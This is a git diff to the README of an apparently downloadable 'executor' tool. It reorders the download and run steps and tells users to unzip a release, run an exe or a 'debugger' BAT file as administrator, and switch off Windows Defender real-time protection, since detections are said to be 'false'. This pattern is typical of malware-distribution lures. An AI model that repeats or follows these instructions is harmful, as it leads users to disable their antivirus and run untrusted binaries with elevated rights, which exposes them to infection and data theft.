@@ -35,6 +35,15 @@ Our team are planning to create a website for the Projects and other future deve
 ## INSTALLATION⬇️
 ![Version](https://img.shields.io/badge/GUIDE-green.svg?maxAge=259200)
 
+### DOWNLOADING 🛠️
+1. Download the zip file in release packages.
+2. unzip the file and go to builder files.
+
+### RUNNING 🛠️
+1. after going to the builder file, you will see a debugger BAT file and exe file.
+2. Right click and run the exe file with or without admin permissions.
+3. (optional) if exe isn't running properly, run the bat file in administrator.
+
 ### IMPORTANT📢
 additional information, when downloading the file it might get a false detection by windows defender so make sure your real-time protection is off.
 
@@ -44,15 +53,6 @@ how to disable real-time protection?
 2. Navigate to "Virus & threat protection."
 3. Click on "Manage settings."
 4. Disable "Real-time protection." 
-
-### DOWNLOADING
-1. Download the zip file in release packages.
-2. unzip the file and go to builder files.
-
-### RUNNING
-1. after going to the builder file, you will see a debugger BAT file and exe file.
-2. Right click and run the exe file with or without permissions.
-3. (optional) if exe isn't running properly, run the bat file in administrator.
 
 ## HELP SUPPORT🎟️
 IF file not working then create an issue ticket and inform us so we can make sure that the executor is working properly.
